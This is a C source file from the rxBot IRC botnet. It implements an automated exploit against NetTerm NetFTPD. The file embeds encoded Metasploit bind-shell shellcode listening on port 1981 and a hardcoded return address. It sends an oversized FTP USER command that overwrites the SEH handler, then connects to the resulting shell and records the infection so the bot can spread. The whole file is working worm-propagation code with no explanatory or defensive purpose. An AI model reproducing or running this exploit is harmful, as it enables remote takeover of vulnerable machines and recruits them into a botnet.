/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_NETFTPD

bool netterm_netftpd(EXINFO exinfo) {
	/* win32_bind -  EXITFUNC=process LPORT=1981 Size=709 Encoder=PexAlphaNum http://metasploit.com */
	unsigned char scode[] =
		"\x81\xc4\x54\xf2\xff\xff" /*add esp, -3500*/
		"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
		"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
		"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
		"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
		"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
		"\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x58"
		"\x4e\x56\x46\x52\x46\x32\x4b\x48\x45\x54\x4e\x33\x4b\x38\x4e\x57"
		"\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x31\x4b\x38"
		"\x4f\x35\x42\x32\x41\x30\x4b\x4e\x49\x54\x4b\x38\x46\x43\x4b\x48"
		"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
		"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
		"\x46\x4f\x4b\x43\x46\x35\x46\x32\x4a\x32\x45\x57\x45\x4e\x4b\x58"
		"\x4f\x45\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x58\x4e\x50\x4b\x54"
		"\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x43\x50\x4e\x42\x4b\x38"
		"\x49\x48\x4e\x46\x46\x42\x4e\x41\x41\x46\x43\x4c\x41\x33\x4b\x4d"
		"\x46\x56\x4b\x38\x43\x34\x42\x33\x4b\x38\x42\x44\x4e\x50\x4b\x58"
		"\x42\x47\x4e\x31\x4d\x4a\x4b\x58\x42\x44\x4a\x50\x50\x55\x4a\x36"
		"\x50\x38\x50\x54\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x56"
		"\x43\x55\x48\x36\x4a\x56\x43\x43\x44\x43\x4a\x56\x47\x37\x43\x57"
		"\x44\x53\x4f\x35\x46\x55\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
		"\x4e\x4f\x4b\x43\x42\x35\x4f\x4f\x48\x4d\x4f\x55\x49\x48\x45\x4e"
		"\x48\x46\x41\x38\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x56\x44\x50"
		"\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x55"
		"\x4f\x4f\x48\x4d\x43\x45\x43\x55\x43\x55\x43\x35\x43\x45\x43\x54"
		"\x43\x55\x43\x54\x43\x35\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x47\x30"
		"\x4d\x4b\x48\x36\x43\x45\x49\x48\x41\x4e\x45\x49\x4a\x36\x46\x4a"
		"\x4c\x31\x42\x37\x47\x4c\x47\x55\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
		"\x41\x55\x45\x45\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x32"
		"\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x45\x45\x55\x4f\x4f\x42\x4d"
		"\x4a\x56\x45\x4e\x49\x34\x48\x38\x49\x54\x47\x55\x4f\x4f\x48\x4d"
		"\x42\x35\x46\x55\x46\x35\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x46"
		"\x47\x4e\x49\x47\x48\x4c\x49\x57\x47\x55\x4f\x4f\x48\x4d\x45\x35"
		"\x4f\x4f\x42\x4d\x48\x46\x4c\x46\x46\x46\x48\x36\x4a\x36\x43\x36"
		"\x4d\x36\x49\x38\x45\x4e\x4c\x46\x42\x55\x49\x55\x49\x42\x4e\x4c"
		"\x49\x58\x47\x4e\x4c\x46\x46\x54\x49\x38\x44\x4e\x41\x33\x42\x4c"
		"\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x52\x50\x4f\x44\x44\x4e\x52"
		"\x43\x49\x4d\x58\x4c\x57\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
		"\x44\x57\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x47\x46\x34\x4f\x4f"
		"\x48\x4d\x4b\x35\x47\x35\x44\x35\x41\x45\x41\x55\x41\x55\x4c\x56"
		"\x41\x50\x41\x45\x41\x55\x45\x55\x41\x45\x4f\x4f\x42\x4d\x4a\x36"
		"\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x56"
		"\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x58\x47\x45\x4e\x4f"
		"\x43\x58\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x35\x4f\x4f\x42\x4d"
		"\x4a\x56\x50\x47\x4a\x4d\x44\x4e\x43\x57\x43\x45\x4f\x4f\x48\x4d"
		"\x4f\x4f\x42\x4d\x5a";

	long retaddr = 0x0040df98; /*NetTerm NetFTPD Universal netftpd.exe (multiple versions)*/

	SOCKET s=fsocket(AF_INET, SOCK_STREAM,0);

	SOCKADDR_IN addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = finet_addr(exinfo.ip);
	addr.sin_port = fhtons(exinfo.port);
	memset(&addr.sin_zero, 0, 8);

	if (fconnect(s, (LPSOCKADDR)&addr, sizeof(addr)) == SOCKET_ERROR) return false;

	//Overwrite the SEH frame and throw an exception
	char user[1020], buf[512];
	memcpy(user, "USER ", 5);
	memcpy(user+5, "\xc0", 1);
	memcpy(user+5+1, scode, sizeof(scode));
	memcpy(user+1014, &retaddr, 4);
	memcpy(user+1014+4, "\r\n", 2);

	fsend(s, user, sizeof(user), 0);
	frecv(s, buf, sizeof(buf), 0);
	fsend(s, "HELP\r\n", 6, 0);

	fclosesocket(s);

	ConnectShell(exinfo, 1981);

	return (AddEx(exinfo, true));
}
#endif